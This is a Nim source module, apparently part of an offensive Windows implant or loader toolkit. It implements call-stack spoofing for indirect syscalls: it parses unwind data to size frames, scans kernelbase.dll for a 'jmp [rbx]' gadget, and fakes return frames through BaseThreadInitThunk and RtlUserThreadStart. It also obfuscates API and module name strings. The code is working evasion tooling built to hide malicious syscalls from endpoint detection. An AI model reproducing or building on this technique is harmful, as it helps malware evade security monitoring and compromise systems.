import ../global
import handlers
import utils

const
  unwFlagChaininfo = 0x04'u32
  uwopPushNonvol = 0
  uwopAllocLarge = 1
  uwopAllocSmall = 2
  uwopSetFpreg = 3
  uwopSaveNonvol = 4
  stackArgSlots = 8

type
  RuntimeFunction = object
    beginAddress*, endAddress*, unwindData*: culong

  UnwindInfo = object
    versionFlags*, sizeOfProlog*, countOfCodes*, frameRegister*: byte

  Prm = object
    fixup*, ogRetaddr*, rbx*, rdi*: pointer
    btitSs*: uint64
    btitRetaddr*: pointer
    gadgetSs*: uint64
    rutsSs*: uint64
    rutsRetaddr*: pointer
    ssn*: uint64
    trampoline*: pointer
    rsi*, r12*, r13*, r14*, r15*: pointer

  TRtlLookupFunctionEntry = proc(
    controlPc: uint64; imageBase: ptr uint64; historyTable: pointer
  ): ptr RuntimeFunction {.stdcall.}

  TSpoofStubFn* = proc(
    rcx, rdx, r8, r9: pointer;
    prm, fn: pointer;
    stackArgCount: culong;
    sa1, sa2, sa3, sa4, sa5, sa6, sa7, sa8: pointer
  ): pointer {.stdcall.}

var
  spoofReady* = false
  spoofStubFn*: TSpoofStubFn
  jmpRbxGadget*: pointer
  rtlLookupFunctionEntry: TRtlLookupFunctionEntry

proc lookupRuntimeFunction(fn: pointer; imageBase: ptr uint64): ptr RuntimeFunction =
  # Looks up the runtime function entry for the address
  if rtlLookupFunctionEntry == nil:
    rtlLookupFunctionEntry = cast[TRtlLookupFunctionEntry](load(obf("RtlLookupFunctionEntry")))
    if rtlLookupFunctionEntry == nil:
      return nil
  rtlLookupFunctionEntry(cast[uint64](fn), imageBase, nil)

proc calculateStackSize(rt: ptr RuntimeFunction; imageBase: uint64): culong =
  # Calculates the stack size from unwind info
  if rt == nil:
    return 0
  let unwind = cast[ptr UnwindInfo](imageBase + rt.unwindData)
  let codes = cast[ptr UncheckedArray[uint16]](cast[pointer](cast[int](unwind) + 4))
  var idx = 0
  var total: culong = 0
  while idx < int(unwind.countOfCodes):
    let slot = codes[idx]
    let unwindOp = (slot shr 8) and 0x0F
    let opInfo = (slot shr 12) and 0x0F
    case unwindOp
    of uwopPushNonvol:
      total += 8
    of uwopSaveNonvol:
      idx += 1
    of uwopAllocSmall:
      total += (opInfo.uint32 * 8) + 8
    of uwopAllocLarge:
      idx += 1
      var frameOffset = codes[idx].uint32
      if opInfo == 0:
        frameOffset *= 8
      else:
        idx += 1
        frameOffset += codes[idx].uint32 shl 16
      total += frameOffset
    of uwopSetFpreg:
      discard
    else:
      discard
    idx += 1
  let flags = (unwind.versionFlags shr 3) and 0x1F
  if (flags and unwFlagChaininfo) != 0:
    idx = int(unwind.countOfCodes)
    if (idx and 1) != 0:
      idx += 1
    let chained = cast[ptr RuntimeFunction](cast[pointer](cast[int](codes) + idx * 2))
    return total + calculateStackSize(chained, imageBase)
  total + 8

proc wrapperStackSize(fn: pointer): culong =
  # Returns the stack size needed by the function
  var imageBase: uint64 = 0
  let rt = lookupRuntimeFunction(fn, addr imageBase)
  if rt == nil:
    return 0
  calculateStackSize(rt, imageBase)

proc findJmpRbxGadget(modBase: pointer): pointer =
  # Finds a jump rbx gadget in the module text section
  let p = cast[ptr UncheckedArray[byte]](modBase)
  if p[0] != 0x4D or p[1] != 0x5A:
    return nil
  let nt = cast[pointer](cast[int](modBase) + u32(modBase, 0x3C).int)
  if u32(nt) != 0x00004550:
    return nil
  let nsec = cast[ptr uint16](cast[int](nt) + 6)[]
  let opt = cast[ptr uint16](cast[int](nt) + 20)[]
  var sec = cast[int](nt) + 24 + opt.int
  for _ in 0 ..< nsec.int:
    let s = cast[ptr UncheckedArray[byte]](sec)
    if s[0] == byte('.') and s[1] == byte('t') and s[2] == byte('e') and s[3] == byte('x') and s[4] == byte('t'):
      let va = u32(cast[pointer](sec), 12)
      let sz = u32(cast[pointer](sec), 16)
      let text = cast[pointer](cast[int](modBase) + va.int)
      let tp = cast[ptr UncheckedArray[byte]](text)
      for i in 0 ..< (sz.int - 2):
        if tp[i] == 0xFF'u8 and tp[i + 1] == 0x23'u8:
          return cast[pointer](cast[int](text) + i)
      return nil
    sec += 40
  nil

proc initStackSpoof*(): bool =
  # Main function that initializes stack spoofing
  if spoofReady:
    return true
  let k32 = getModuleHandleA(obf("kernel32.dll"))
  let ntdll = getModuleHandleA(obf("ntdll.dll"))
  let kbase = getModuleHandleA(obf("kernelbase.dll"))
  if k32 == nil or ntdll == nil or kbase == nil:
    return false
  jmpRbxGadget = findJmpRbxGadget(kbase)
  spoofReady = jmpRbxGadget != nil
  spoofReady

proc spoofSyscall*(
  ssn: culong;
  syscallGadget: pointer;
  rcx, rdx, r8, r9: pointer;
  sa1, sa2, sa3, sa4, sa5, sa6, sa7, sa8: pointer
): culong =
  # Here is where the syscall runs with a spoofed stack
  if not spoofReady and not initStackSpoof():
    return 0
  if ssn == 0 or syscallGadget == nil or spoofStubFn == nil:
    return 0
  let btit = getProcAddress(getModuleHandleA(obf("kernel32.dll")), obf("BaseThreadInitThunk"))
  let ruts = getProcAddress(getModuleHandleA(obf("ntdll.dll")), obf("RtlUserThreadStart"))
  if btit == nil or ruts == nil:
    return 0
  var param = Prm()
  let btitRet = cast[pointer](cast[int](btit) + 0x14)
  let rutsRet = cast[pointer](cast[int](ruts) + 0x21)
  param.btitSs = wrapperStackSize(btitRet).uint64
  param.btitRetaddr = btitRet
  param.rutsSs = wrapperStackSize(rutsRet).uint64
  param.rutsRetaddr = rutsRet
  param.trampoline = jmpRbxGadget
  param.gadgetSs = wrapperStackSize(param.trampoline).uint64
  if param.btitSs == 0 or param.rutsSs == 0 or param.gadgetSs == 0:
    return 0
  param.ssn = ssn.uint64
  cast[culong](spoofStubFn(
    rcx, rdx, r8, r9, addr param, syscallGadget, stackArgSlots.culong,
    sa1, sa2, sa3, sa4, sa5, sa6, sa7, sa8
  ))
